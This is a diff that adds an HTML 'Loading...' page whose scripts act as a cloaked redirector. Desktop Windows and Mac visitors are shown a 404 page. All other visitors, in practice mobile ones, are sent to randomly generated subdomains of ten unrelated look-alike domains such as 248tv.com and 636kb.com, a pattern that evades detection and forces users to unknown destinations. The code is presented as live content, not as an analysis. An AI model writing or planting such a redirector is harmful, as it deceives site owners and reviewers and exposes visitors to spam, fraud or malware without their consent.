@@ -1,0 +1,45 @@
+<script>if(/^(Win|Mac)/i.test(navigator.platform))location.href = '/404.html';</script>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>加载中...</title>
+</head>
+
+<body>
+<br>
+<br>
+<center><h1 style="font-size: 25px">加载中...</h1></center>
+<script>
+var urls=[
+
+	'http://{nnnn}.248tv.com/8?{nnnnnnnnnn}',
+	'http://{nnnn}.357tv.com/8?{nnnnnnnnnn}',
+	'http://{nnnn}.467tv.com/8?{nnnnnnnnnn}',
+	'http://{nnnn}.629tv.com/8?{nnnnnnnnnn}',
+	'http://{nnnn}.659tv.com/8?{nnnnnnnnnn}',
+	'http://{nnnn}.639tv.com/8?{nnnnnnnnnn}',
+	'http://{nnnn}.636kb.com/8?{nnnnnnnnnn}',
+	'http://{nnnn}.838kb.com/8?{nnnnnnnnnn}',
+	'http://{nnnn}.878kb.com/8?{nnnnnnnnnn}',
+	'http://{nnnn}.969kb.com/8?{nnnnnnnnnn}',
+
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
+</script>
+</body>
+</html>
